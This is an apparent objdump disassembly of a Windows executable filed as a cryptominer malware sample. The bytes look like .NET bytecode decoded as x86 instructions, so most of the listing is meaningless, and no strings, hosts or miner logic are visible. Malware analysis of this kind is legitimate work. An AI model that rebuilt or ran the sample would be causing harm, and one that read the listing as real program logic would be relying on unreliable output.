
malware_samples/miner/21002b151682ef9a961c566ffe0c1ab0b6f68995c779c5c9c8d19dd9119ba204.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	30 7a 02             	xor    %bh,0x2(%edx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f8 ba 00       	add    $0xbaf800,%eax
  402013:	00 08                	add    %cl,(%eax)
  402015:	bf 01 00 03 00       	mov    $0x30001,%edi
  40201a:	02 00                	add    (%eax),%al
  40201c:	3b 01                	cmp    (%ecx),%eax
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	2c 00                	sub    $0x0,%al
  402052:	3b 00                	cmp    (%eax),%eax
  402054:	2b 00                	sub    (%eax),%eax
  402056:	7c 00                	jl     0x402058
  402058:	20 00                	and    %al,(%eax)
  40205a:	00 00                	add    %al,(%eax)
  40205c:	5e                   	pop    %esi
  40205d:	02 d0                	add    %al,%dl
  40205f:	07                   	pop    %es
  402060:	00 00                	add    %al,(%eax)
  402062:	1b 28                	sbb    (%eax),%ebp
  402064:	3c 00                	cmp    $0x0,%al
  402066:	00 0a                	add    %cl,(%edx)
  402068:	03 28                	add    (%eax),%ebp
  40206a:	08 00                	or     %al,(%eax)
  40206c:	00 06                	add    %al,(%esi)
  40206e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40206f:	07                   	pop    %es
  402070:	00 00                	add    %al,(%eax)
  402072:	1b 2a                	sbb    (%edx),%ebp
  402074:	5e                   	pop    %esi
  402075:	02 d0                	add    %al,%dl
  402077:	07                   	pop    %es
  402078:	00 00                	add    %al,(%eax)
  40207a:	1b 28                	sbb    (%eax),%ebp
  40207c:	3c 00                	cmp    $0x0,%al
  40207e:	00 0a                	add    %cl,(%edx)
  402080:	03 28                	add    (%eax),%ebp
  402082:	05 00 00 06 a5       	add    $0xa5060000,%eax
  402087:	07                   	pop    %es
  402088:	00 00                	add    %al,(%eax)
  40208a:	1b 2a                	sbb    (%edx),%ebp
  40208c:	ae                   	scas   %es:(%edi),%al
  40208d:	02 2d 0b 72 6b 00    	add    0x6b720b,%ch
  402093:	00 70 73             	add    %dh,0x73(%eax)
  402096:	4b                   	dec    %ebx
  402097:	00 00                	add    %al,(%eax)
  402099:	0a 7a 03             	or     0x3(%edx),%bh
  40209c:	2d 0b 72 79 00       	sub    $0x79720b,%eax
  4020a1:	00 70 73             	add    %dh,0x73(%eax)
  4020a4:	4b                   	dec    %ebx
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	0a 7a 02             	or     0x2(%edx),%bh
  4020aa:	04 28                	add    $0x28,%al
  4020ac:	28 00                	sub    %al,(%eax)
  4020ae:	00 06                	add    %al,(%esi)
  4020b0:	03 04 28             	add    (%eax,%ebp,1),%eax
  4020b3:	0b 00                	or     (%eax),%eax
  4020b5:	00 06                	add    %al,(%esi)
  4020b7:	2a 5a 02             	sub    0x2(%edx),%bl
  4020ba:	03 33                	add    (%ebx),%esi
  4020bc:	02 17                	add    (%edi),%dl
  4020be:	2a 02                	sub    (%edx),%al
  4020c0:	2d 05 03 14 fe       	sub    $0xfe140305,%eax
  4020c5:	01 2a                	add    %ebp,(%edx)
  4020c7:	02 03                	add    (%ebx),%al
  4020c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ca:	3f                   	aas
  4020cb:	00 00                	add    %al,(%eax)
  4020cd:	0a 2a                	or     (%edx),%ch
  4020cf:	2a 14 02             	sub    (%edx,%eax,1),%dl
  4020d2:	03 04 28             	add    (%eax,%ebp,1),%eax
  4020d5:	1d 00 00 06 2a       	sbb    $0x2a060000,%eax
  4020da:	b2 02                	mov    $0x2,%dl
  4020dc:	16                   	push   %ss
  4020dd:	6a 2f                	push   $0x2f
  4020df:	0b 72 d5             	or     -0x2b(%edx),%esi
  4020e2:	04 00                	add    $0x0,%al
  4020e4:	70 73                	jo     0x402159
  4020e6:	30 01                	xor    %al,(%ecx)
  4020e8:	00 06                	add    %al,(%esi)
  4020ea:	2a 72 74             	sub    0x74(%edx),%dh
  4020ed:	05 00 70 0f 00       	add    $0xf7000,%eax
  4020f2:	28 88 00 00 0a 72    	sub    %cl,0x720a0000(%eax)
  4020f8:	e8 05 00 70 28       	call   0x28b02102
  4020fd:	5b                   	pop    %ebx
  4020fe:	00 00                	add    %al,(%eax)
  402100:	0a 73 30             	or     0x30(%ebx),%dh
  402103:	01 00                	add    %eax,(%eax)
  402105:	06                   	push   %es
  402106:	2a 72 72             	sub    0x72(%edx),%dh
  402109:	26 07                	es pop %es
  40210b:	00 70 0f             	add    %dh,0xf(%eax)
  40210e:	00 28                	add    %ch,(%eax)
  402110:	87 00                	xchg   %eax,(%eax)
  402112:	00 0a                	add    %cl,(%edx)
  402114:	72 23                	jb     0x402139
  402116:	03 00                	add    (%eax),%eax
  402118:	70 28                	jo     0x402142
  40211a:	5b                   	pop    %ebx
  40211b:	00 00                	add    %al,(%eax)
  40211d:	0a 73 30             	or     0x30(%ebx),%dh
  402120:	01 00                	add    %eax,(%eax)
  402122:	06                   	push   %es
  402123:	2a 36                	sub    (%esi),%dh
  402125:	02 7e 4a             	add    0x4a(%esi),%bh
  402128:	00 00                	add    %al,(%eax)
  40212a:	04 03                	add    $0x3,%al
  40212c:	28 2f                	sub    %ch,(%edi)
  40212e:	00 00                	add    %al,(%eax)
  402130:	06                   	push   %es
  402131:	2a 56 03             	sub    0x3(%esi),%dl
  402134:	2c 10                	sub    $0x10,%al
  402136:	03 6f e3             	add    -0x1d(%edi),%ebp
  402139:	00 00                	add    %al,(%eax)
  40213b:	06                   	push   %es
  40213c:	2d 08 03 02 6f       	sub    $0x6f020308,%eax
  402141:	0a 01                	or     (%ecx),%al
  402143:	00 06                	add    %al,(%esi)
  402145:	2a 02                	sub    (%edx),%al
  402147:	7a 4e                	jp     0x402197
  402149:	02 14 fe             	add    (%esi,%edi,8),%dl
  40214c:	06                   	push   %es
  40214d:	a9 00 00 0a 73       	test   $0x730a0000,%eax
  402152:	bf 00 00 0a 28       	mov    $0x280a0000,%edi
  402157:	34 00                	xor    $0x0,%al
  402159:	00 06                	add    %al,(%esi)
  40215b:	2a 2a                	sub    (%edx),%ch
  40215d:	02 75 0e             	add    0xe(%ebp),%dh
  402160:	00 00                	add    %al,(%eax)
  402162:	01 14 fe             	add    %edx,(%esi,%edi,8)
  402165:	03 2a                	add    (%edx),%ebp
  402167:	ea 02 2d 0b 72 5d 00 	ljmp   $0x5d,$0x720b2d02
  40216e:	00 70 73             	add    %dh,0x73(%eax)
  402171:	4b                   	dec    %ebx
  402172:	00 00                	add    %al,(%eax)
  402174:	0a 7a 03             	or     0x3(%edx),%bh
  402177:	2d 0c 02 72 d1       	sub    $0xd172020c,%eax
  40217c:	07                   	pop    %es
  40217d:	00 70 6f             	add    %dh,0x6f(%eax)
  402180:	4c                   	dec    %esp
  402181:	00 00                	add    %al,(%eax)
  402183:	0a 2a                	or     (%edx),%ch
  402185:	02 1f                	add    (%edi),%bl
  402187:	22 6f 4d             	and    0x4d(%edi),%ch
  40218a:	00 00                	add    %al,(%eax)
  40218c:	0a 02                	or     (%edx),%al
  40218e:	03 28                	add    (%eax),%ebp
  402190:	4b                   	dec    %ebx
  402191:	00 00                	add    %al,(%eax)
  402193:	06                   	push   %es
  402194:	6f                   	outsl  %ds:(%esi),(%dx)
  402195:	4c                   	dec    %esp
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 02                	or     (%edx),%al
  40219a:	1f                   	pop    %ds
  40219b:	22 6f 4d             	and    0x4d(%edi),%ch
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	0a 2a                	or     (%edx),%ch
  4021a2:	d6                   	salc
  4021a3:	02 2d 0b 72 5d 00    	add    0x5d720b,%ch
  4021a9:	00 70 73             	add    %dh,0x73(%eax)
  4021ac:	4b                   	dec    %ebx
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	0a 7a 03             	or     0x3(%edx),%bh
  4021b2:	2d 0c 02 72 d1       	sub    $0xd172020c,%eax
  4021b7:	07                   	pop    %es
  4021b8:	00 70 6f             	add    %dh,0x6f(%eax)
  4021bb:	4c                   	dec    %esp
  4021bc:	00 00                	add    %al,(%eax)
  4021be:	0a 2a                	or     (%edx),%ch
  4021c0:	02 1f                	add    (%edi),%bl
  4021c2:	22 6f 4d             	and    0x4d(%edi),%ch
  4021c5:	00 00                	add    %al,(%eax)
  4021c7:	0a 02                	or     (%edx),%al
  4021c9:	03 6f 4c             	add    0x4c(%edi),%ebp
  4021cc:	00 00                	add    %al,(%eax)
  4021ce:	0a 02                	or     (%edx),%al
  4021d0:	1f                   	pop    %ds
  4021d1:	22 6f 4d             	and    0x4d(%edi),%ch
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 2a                	or     (%edx),%ch
  4021d8:	ce                   	into
  4021d9:	02 1f                	add    (%edi),%bl
  4021db:	5c                   	pop    %esp
  4021dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4021dd:	92                   	xchg   %eax,%edx
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	0a 26                	or     (%esi),%ah
  4021e2:	02 1f                	add    (%edi),%bl
  4021e4:	75 6f                	jne    0x402255
  4021e6:	92                   	xchg   %eax,%edx
  4021e7:	00 00                	add    %al,(%eax)
  4021e9:	0a 26                	or     (%esi),%ah
  4021eb:	02 28                	add    (%eax),%ch
  4021ed:	79 00                	jns    0x4021ef
  4021ef:	00 0a                	add    %cl,(%edx)
  4021f1:	72 a6                	jb     0x402199
  4021f3:	09 00                	or     %eax,(%eax)
  4021f5:	70 17                	jo     0x40220e
  4021f7:	8d 02                	lea    (%edx),%eax
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	01 25 16 03 8c 7e    	add    %esp,0x7e8c0316
  402201:	00 00                	add    %al,(%eax)
  402203:	01 a2 6f f7 00 00    	add    %esp,0xf76f(%edx)
  402209:	0a 26                	or     (%esi),%ah
  40220b:	2a ba 02 2d 0b 72    	sub    0x720b2d02(%edx),%bh
  402211:	5d                   	pop    %ebp
  402212:	00 00                	add    %al,(%eax)
  402214:	70 73                	jo     0x402289
  402216:	4b                   	dec    %ebx
  402217:	00 00                	add    %al,(%eax)
  402219:	0a 7a 04             	or     0x4(%edx),%bh
  40221c:	25 2d 06 26 73       	and    $0x7326062d,%eax
  402221:	e2 00                	loop   0x402223
  402223:	00 06                	add    %al,(%esi)
  402225:	10 02                	adc    %al,(%edx)
  402227:	02 04 6f             	add    (%edi,%ebp,2),%al
  40222a:	f3 00 00             	repz add %al,(%eax)
  40222d:	06                   	push   %es
  40222e:	73 f8                	jae    0x402228
  402230:	00 00                	add    %al,(%eax)
  402232:	0a 03                	or     (%ebx),%al
  402234:	04 28                	add    $0x28,%al
  402236:	4a                   	dec    %edx
  402237:	00 00                	add    %al,(%eax)
  402239:	06                   	push   %es
  40223a:	2a 32                	sub    (%edx),%dh
  40223c:	02 6f 74             	add    0x74(%edi),%ch
  40223f:	00 00                	add    %al,(%eax)
  402241:	0a 28                	or     (%eax),%ch
  402243:	02 00                	add    (%eax),%al
  402245:	00 2b                	add    %ch,(%ebx)
  402247:	2a f2                	sub    %dl,%dh
  402249:	04 2c                	add    $0x2c,%al
  40224b:	10 02                	adc    %al,(%edx)
  40224d:	28 4f 00             	sub    %cl,0x0(%edi)
  402250:	00 06                	add    %al,(%esi)
  402252:	10 00                	adc    %al,(%eax)
  402254:	03 28                	add    (%eax),%ebp
  402256:	4f                   	dec    %edi
  402257:	00 00                	add    %al,(%eax)
  402259:	06                   	push   %es
  40225a:	10 01                	adc    %al,(%ecx)
  40225c:	02 2d 05 03 14 fe    	add    0xfe140305,%ch
  402262:	01 2a                	add    %ebp,(%edx)
  402264:	03 2d 02 16 2a 02    	add    0x22a1602,%ebp
  40226a:	6f                   	outsl  %ds:(%esi),(%dx)
  40226b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40226c:	00 00                	add    %al,(%eax)
  40226e:	0a 03                	or     (%ebx),%al
  402270:	6f                   	outsl  %ds:(%esi),(%dx)
  402271:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402272:	00 00                	add    %al,(%eax)
  402274:	0a 2e                	or     (%esi),%ch
  402276:	02 16                	add    (%esi),%dl
  402278:	2a 02                	sub    (%edx),%al
  40227a:	03 1b                	add    (%ebx),%ebx
  40227c:	28 a3 00 00 0a 16    	sub    %ah,0x160a0000(%ebx)
  402282:	fe 01                	incb   (%ecx)
  402284:	2a 1e                	sub    (%esi),%bl
  402286:	02 7b 15             	add    0x15(%ebx),%bh
  402289:	00 00                	add    %al,(%eax)
  40228b:	04 2a                	add    $0x2a,%al
  40228d:	22 02                	and    (%edx),%al
  40228f:	03 7d 15             	add    0x15(%ebp),%edi
  402292:	00 00                	add    %al,(%eax)
  402294:	04 2a                	add    $0x2a,%al
  402296:	0a 14 2a             	or     (%edx,%ebp,1),%dl
  402299:	1e                   	push   %ds
  40229a:	02 28                	add    (%eax),%ch
  40229c:	03 01                	add    (%ecx),%eax
  40229e:	00 0a                	add    %cl,(%edx)
  4022a0:	2a 1e                	sub    (%esi),%bl
  4022a2:	02 7b 16             	add    0x16(%ebx),%bh
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 2a                	add    $0x2a,%al
  4022a9:	72 03                	jb     0x4022ae
  4022ab:	28 6d 00             	sub    %ch,0x0(%ebp)
  4022ae:	00 0a                	add    %cl,(%edx)
  4022b0:	2c 0c                	sub    $0xc,%al
  4022b2:	14 72                	adc    $0x72,%al
  4022b4:	a3 00 00 70 73       	mov    %eax,0x73700000
  4022b9:	04 01                	add    $0x1,%al
  4022bb:	00 0a                	add    %cl,(%edx)
  4022bd:	7a 02                	jp     0x4022c1
  4022bf:	03 7d 16             	add    0x16(%ebp),%edi
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	04 2a                	add    $0x2a,%al
  4022c6:	1e                   	push   %ds
  4022c7:	02 7b 17             	add    0x17(%ebx),%bh
  4022ca:	00 00                	add    %al,(%eax)
  4022cc:	04 2a                	add    $0x2a,%al
  4022ce:	72 03                	jb     0x4022d3
  4022d0:	28 6d 00             	sub    %ch,0x0(%ebp)
  4022d3:	00 0a                	add    %cl,(%edx)
  4022d5:	2c 0c                	sub    $0xc,%al
  4022d7:	14 72                	adc    $0x72,%al
  4022d9:	a3 00 00 70 73       	mov    %eax,0x73700000
  4022de:	04 01                	add    $0x1,%al
  4022e0:	00 0a                	add    %cl,(%edx)
  4022e2:	7a 02                	jp     0x4022e6
  4022e4:	03 7d 17             	add    0x17(%ebp),%edi
  4022e7:	00 00                	add    %al,(%eax)
  4022e9:	04 2a                	add    $0x2a,%al
  4022eb:	1e                   	push   %ds
  4022ec:	02 7b 18             	add    0x18(%ebx),%bh
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	04 2a                	add    $0x2a,%al
  4022f3:	72 03                	jb     0x4022f8
  4022f5:	28 6d 00             	sub    %ch,0x0(%ebp)
  4022f8:	00 0a                	add    %cl,(%edx)
  4022fa:	2c 0c                	sub    $0xc,%al
  4022fc:	14 72                	adc    $0x72,%al
  4022fe:	a3 00 00 70 73       	mov    %eax,0x73700000
  402303:	04 01                	add    $0x1,%al
  402305:	00 0a                	add    %cl,(%edx)
  402307:	7a 02                	jp     0x40230b
  402309:	03 7d 18             	add    0x18(%ebp),%edi
  40230c:	00 00                	add    %al,(%eax)
  40230e:	04 2a                	add    $0x2a,%al
  402310:	1e                   	push   %ds
  402311:	02 7b 1b             	add    0x1b(%ebx),%bh
  402314:	00 00                	add    %al,(%eax)
  402316:	04 2a                	add    $0x2a,%al
  402318:	22 02                	and    (%edx),%al
  40231a:	03 7d 1b             	add    0x1b(%ebp),%edi
  40231d:	00 00                	add    %al,(%eax)
  40231f:	04 2a                	add    $0x2a,%al
  402321:	1e                   	push   %ds
  402322:	02 7b 1c             	add    0x1c(%ebx),%bh
  402325:	00 00                	add    %al,(%eax)
  402327:	04 2a                	add    $0x2a,%al
  402329:	22 02                	and    (%edx),%al
  40232b:	03 7d 1c             	add    0x1c(%ebp),%edi
  40232e:	00 00                	add    %al,(%eax)
  402330:	04 2a                	add    $0x2a,%al
  402332:	1e                   	push   %ds
  402333:	02 7b 19             	add    0x19(%ebx),%bh
  402336:	00 00                	add    %al,(%eax)
  402338:	04 2a                	add    $0x2a,%al
  40233a:	5a                   	pop    %edx
  40233b:	03 2d 0b 72 a3 00    	add    0xa3720b,%ebp
  402341:	00 70 73             	add    %dh,0x73(%eax)
  402344:	4b                   	dec    %ebx
  402345:	00 00                	add    %al,(%eax)
  402347:	0a 7a 02             	or     0x2(%edx),%bh
  40234a:	03 7d 19             	add    0x19(%ebp),%edi
  40234d:	00 00                	add    %al,(%eax)
  40234f:	04 2a                	add    $0x2a,%al
  402351:	1e                   	push   %ds
  402352:	02 7b 1a             	add    0x1a(%ebx),%bh
  402355:	00 00                	add    %al,(%eax)
  402357:	04 2a                	add    $0x2a,%al
  402359:	72 03                	jb     0x40235e
  40235b:	14 28                	adc    $0x28,%al
  40235d:	4f                   	dec    %edi
  40235e:	00 00                	add    %al,(%eax)
  402360:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402363:	72 a3                	jb     0x402308
  402365:	00 00                	add    %al,(%eax)
  402367:	70 73                	jo     0x4023dc
  402369:	4b                   	dec    %ebx
  40236a:	00 00                	add    %al,(%eax)
  40236c:	0a 7a 02             	or     0x2(%edx),%bh
  40236f:	03 7d 1a             	add    0x1a(%ebp),%edi
  402372:	00 00                	add    %al,(%eax)
  402374:	04 2a                	add    $0x2a,%al
  402376:	1e                   	push   %ds
  402377:	02 28                	add    (%eax),%ch
  402379:	59                   	pop    %ecx
  40237a:	00 00                	add    %al,(%eax)
  40237c:	06                   	push   %es
  40237d:	2a 86 03 2d 02 16    	sub    0x16022d03(%esi),%al
  402383:	2a 03                	sub    (%ebx),%al
  402385:	6f                   	outsl  %ds:(%esi),(%dx)
  402386:	53                   	push   %ebx
  402387:	00 00                	add    %al,(%eax)
  402389:	0a 02                	or     (%edx),%al
  40238b:	28 65 00             	sub    %ah,0x0(%ebp)
  40238e:	00 06                	add    %al,(%esi)
  402390:	28 07                	sub    %al,(%edi)
  402392:	01 00                	add    %eax,(%eax)
  402394:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402397:	16                   	push   %ss
  402398:	2a 03                	sub    (%ebx),%al
  40239a:	28 41 00             	sub    %al,0x0(%ecx)
  40239d:	00 06                	add    %al,(%esi)
  40239f:	2a 36                	sub    (%esi),%dh
  4023a1:	02 28                	add    (%eax),%ch
  4023a3:	61                   	popa
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	06                   	push   %es
  4023a7:	03 28                	add    (%eax),%ebp
  4023a9:	10 00                	adc    %al,(%eax)
  4023ab:	00 06                	add    %al,(%esi)
  4023ad:	2a de                	sub    %dh,%bl
  4023af:	02 14 28             	add    (%eax,%ebp,1),%dl
  4023b2:	4f                   	dec    %edi
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4023b8:	72 58                	jb     0x402412
  4023ba:	01 00                	add    %eax,(%eax)
  4023bc:	70 73                	jo     0x402431
  4023be:	4b                   	dec    %ebx
  4023bf:	00 00                	add    %al,(%eax)
  4023c1:	0a 7a 04             	or     0x4(%edx),%bh
  4023c4:	2d 0b 72 ea 0a       	sub    $0xaea720b,%eax
  4023c9:	00 70 73             	add    %dh,0x73(%eax)
  4023cc:	4b                   	dec    %ebx
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	0a 7a 03             	or     0x3(%edx),%bh
  4023d2:	25 2d 06 26 73       	and    $0x7326062d,%eax
  4023d7:	e2 00                	loop   0x4023d9
  4023d9:	00 06                	add    %al,(%esi)
  4023db:	10 01                	adc    %al,(%ecx)
  4023dd:	02 03                	add    (%ebx),%al
  4023df:	04 28                	add    $0x28,%al
  4023e1:	96                   	xchg   %eax,%esi
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	06                   	push   %es
  4023e5:	2a de                	sub    %dh,%bl
  4023e7:	02 14 28             	add    (%eax,%ebp,1),%dl
  4023ea:	4f                   	dec    %edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4023f0:	72 58                	jb     0x40244a
  4023f2:	01 00                	add    %eax,(%eax)
  4023f4:	70 73                	jo     0x402469
  4023f6:	4b                   	dec    %ebx
  4023f7:	00 00                	add    %al,(%eax)
  4023f9:	0a 7a 04             	or     0x4(%edx),%bh
  4023fc:	2d 0b 72 ea 0a       	sub    $0xaea720b,%eax
  402401:	00 70 73             	add    %dh,0x73(%eax)
  402404:	4b                   	dec    %ebx
  402405:	00 00                	add    %al,(%eax)
  402407:	0a 7a 03             	or     0x3(%edx),%bh
  40240a:	25 2d 06 26 73       	and    $0x7326062d,%eax
  40240f:	e2 00                	loop   0x402411
  402411:	00 06                	add    %al,(%esi)
  402413:	10 01                	adc    %al,(%ecx)
  402415:	02 03                	add    (%ebx),%al
  402417:	04 28                	add    $0x28,%al
  402419:	97                   	xchg   %eax,%edi
  40241a:	00 00                	add    %al,(%eax)
  40241c:	06                   	push   %es
  40241d:	2a de                	sub    %dh,%bl
  40241f:	02 14 28             	add    (%eax,%ebp,1),%dl
  402422:	4f                   	dec    %edi
  402423:	00 00                	add    %al,(%eax)
  402425:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402428:	72 58                	jb     0x402482
  40242a:	01 00                	add    %eax,(%eax)
  40242c:	70 73                	jo     0x4024a1
  40242e:	4b                   	dec    %ebx
  40242f:	00 00                	add    %al,(%eax)
  402431:	0a 7a 04             	or     0x4(%edx),%bh
  402434:	2d 0b 72 ea 0a       	sub    $0xaea720b,%eax
  402439:	00 70 73             	add    %dh,0x73(%eax)
  40243c:	4b                   	dec    %ebx
  40243d:	00 00                	add    %al,(%eax)
  40243f:	0a 7a 03             	or     0x3(%edx),%bh
  402442:	25 2d 06 26 73       	and    $0x7326062d,%eax
  402447:	e2 00                	loop   0x402449
  402449:	00 06                	add    %al,(%esi)
  40244b:	10 01                	adc    %al,(%ecx)
  40244d:	02 03                	add    (%ebx),%al
  40244f:	04 28                	add    $0x28,%al
  402451:	98                   	cwtl
  402452:	00 00                	add    %al,(%eax)
  402454:	06                   	push   %es
  402455:	2a de                	sub    %dh,%bl
  402457:	02 14 28             	add    (%eax,%ebp,1),%dl
  40245a:	4f                   	dec    %edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402460:	72 58                	jb     0x4024ba
  402462:	01 00                	add    %eax,(%eax)
  402464:	70 73                	jo     0x4024d9
  402466:	4b                   	dec    %ebx
  402467:	00 00                	add    %al,(%eax)
  402469:	0a 7a 04             	or     0x4(%edx),%bh
  40246c:	2d 0b 72 ea 0a       	sub    $0xaea720b,%eax
  402471:	00 70 73             	add    %dh,0x73(%eax)
  402474:	4b                   	dec    %ebx
  402475:	00 00                	add    %al,(%eax)
  402477:	0a 7a 03             	or     0x3(%edx),%bh
  40247a:	25 2d 06 26 73       	and    $0x7326062d,%eax
  40247f:	e2 00                	loop   0x402481
  402481:	00 06                	add    %al,(%esi)
  402483:	10 01                	adc    %al,(%ecx)
  402485:	02 03                	add    (%ebx),%al
  402487:	04 28                	add    $0x28,%al
  402489:	99                   	cltd
  40248a:	00 00                	add    %al,(%eax)
  40248c:	06                   	push   %es
  40248d:	2a a2 02 14 28 4f    	sub    0x4f281402(%edx),%ah
  402493:	00 00                	add    %al,(%eax)
  402495:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402498:	72 58                	jb     0x4024f2
  40249a:	01 00                	add    %eax,(%eax)
  40249c:	70 73                	jo     0x402511
  40249e:	4b                   	dec    %ebx
  40249f:	00 00                	add    %al,(%eax)
  4024a1:	0a 7a 03             	or     0x3(%edx),%bh
  4024a4:	25 2d 06 26 73       	and    $0x7326062d,%eax
  4024a9:	e2 00                	loop   0x4024ab
  4024ab:	00 06                	add    %al,(%esi)
  4024ad:	10 01                	adc    %al,(%ecx)
  4024af:	02 03                	add    (%ebx),%al
  4024b1:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4024b7:	a2 02 14 28 4f       	mov    %al,0x4f281402
  4024bc:	00 00                	add    %al,(%eax)
  4024be:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4024c1:	72 58                	jb     0x40251b
  4024c3:	01 00                	add    %eax,(%eax)
  4024c5:	70 73                	jo     0x40253a
  4024c7:	4b                   	dec    %ebx
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 7a 03             	or     0x3(%edx),%bh
  4024cd:	25 2d 06 26 73       	and    $0x7326062d,%eax
  4024d2:	e2 00                	loop   0x4024d4
  4024d4:	00 06                	add    %al,(%esi)
  4024d6:	10 01                	adc    %al,(%ecx)
  4024d8:	02 03                	add    (%ebx),%al
  4024da:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  4024e0:	5a                   	pop    %edx
  4024e1:	02 2d 0b 72 62 01    	add    0x162720b,%ch
  4024e7:	00 70 73             	add    %dh,0x73(%eax)
  4024ea:	4b                   	dec    %ebx
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	0a 7a 02             	or     0x2(%edx),%bh
  4024f0:	03 28                	add    (%eax),%ebp
  4024f2:	03 00                	add    (%eax),%eax
  4024f4:	00 2b                	add    %ch,(%ebx)
  4024f6:	2a 62 02             	sub    0x2(%edx),%ah
  4024f9:	28 03                	sub    %al,(%ebx)
  4024fb:	01 00                	add    %eax,(%eax)
  4024fd:	0a 02                	or     (%edx),%al
  4024ff:	03 74 09 00          	add    0x0(%ecx,%ecx,1),%esi
  402503:	00 01                	add    %al,(%ecx)
  402505:	6f                   	outsl  %ds:(%esi),(%dx)
  402506:	18 00                	sbb    %al,(%eax)
  402508:	00 0a                	add    %cl,(%edx)
  40250a:	7d 1d                	jge    0x402529
  40250c:	00 00                	add    %al,(%eax)
  40250e:	04 2a                	add    $0x2a,%al
  402510:	32 02                	xor    (%edx),%al
  402512:	28 76 00             	sub    %dh,0x0(%esi)
  402515:	00 06                	add    %al,(%esi)
  402517:	8c 1d 00 00 01 2a    	mov    %ds,0x2a010000
  40251d:	32 02                	xor    (%edx),%al
  40251f:	7b 1d                	jnp    0x40253e
  402521:	00 00                	add    %al,(%eax)
  402523:	04 6f                	add    $0x6f,%al
  402525:	07                   	pop    %es
  402526:	00 00                	add    %al,(%eax)
  402528:	0a 2a                	or     (%edx),%ch
  40252a:	32 02                	xor    (%edx),%al
  40252c:	7b 1d                	jnp    0x40254b
  40252e:	00 00                	add    %al,(%eax)
  402530:	04 6f                	add    $0x6f,%al
  402532:	08 00                	or     %al,(%eax)
  402534:	00 0a                	add    %cl,(%edx)
  402536:	2a 4e 02             	sub    0x2(%esi),%cl
  402539:	28 03                	sub    %al,(%ebx)
  40253b:	01 00                	add    %eax,(%eax)
  40253d:	0a 02                	or     (%edx),%al
  40253f:	03 73 75             	add    0x75(%ebx),%esi
  402542:	00 00                	add    %al,(%eax)
  402544:	06                   	push   %es
  402545:	7d 20                	jge    0x402567
  402547:	00 00                	add    %al,(%eax)
  402549:	04 2a                	add    $0x2a,%al
  40254b:	1a 73 0c             	sbb    0xc(%ebx),%dh
  40254e:	01 00                	add    %eax,(%eax)
  402550:	0a 7a 1e             	or     0x1e(%edx),%bh
  402553:	02 7b 20             	add    0x20(%ebx),%bh
  402556:	00 00                	add    %al,(%eax)
  402558:	04 2a                	add    $0x2a,%al
  40255a:	32 02                	xor    (%edx),%al
  40255c:	7b 28                	jnp    0x402586
  40255e:	00 00                	add    %al,(%eax)
  402560:	04 6f                	add    $0x6f,%al
  402562:	f0 00 00             	lock add %al,(%eax)
  402565:	0a 2a                	or     (%edx),%ch
  402567:	5e                   	pop    %esi
  402568:	02 6f f0             	add    -0x10(%edi),%ch
  40256b:	00 00                	add    %al,(%eax)
  40256d:	0a 72 0c             	or     0xc(%edx),%dh
  402570:	0b 00                	or     (%eax),%eax
  402572:	70 03                	jo     0x402577
  402574:	6f                   	outsl  %ds:(%esi),(%dx)
  402575:	0d 01 00 06 28       	or     $0x28060001,%eax
  40257a:	5b                   	pop    %ebx
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 2a                	or     (%edx),%ch
  40257f:	76 1f                	jbe    0x4025a0
  402581:	fe                   	(bad)
  402582:	73 a1                	jae    0x402525
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	25 02 7d 31 00       	and    $0x317d02,%eax
  40258c:	00 04 25 03 7d 2d 00 	add    %al,0x2d7d03(,%eiz,1)
  402593:	00 04 25 04 7d 2f 00 	add    %al,0x2f7d04(,%eiz,1)
  40259a:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40259d:	76 1f                	jbe    0x4025be
  40259f:	fe                   	(bad)
  4025a0:	73 a9                	jae    0x40254b
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	06                   	push   %es
  4025a5:	25 02 7d 3d 00       	and    $0x3d7d02,%eax
  4025aa:	00 04 25 03 7d 39 00 	add    %al,0x397d03(,%eiz,1)
  4025b1:	00 04 25 04 7d 3b 00 	add    %al,0x3b7d04(,%eiz,1)
  4025b8:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4025bb:	7e 73                	jle    0x402630
  4025bd:	1d 01 00 0a 80       	sbb    $0x800a0001,%eax
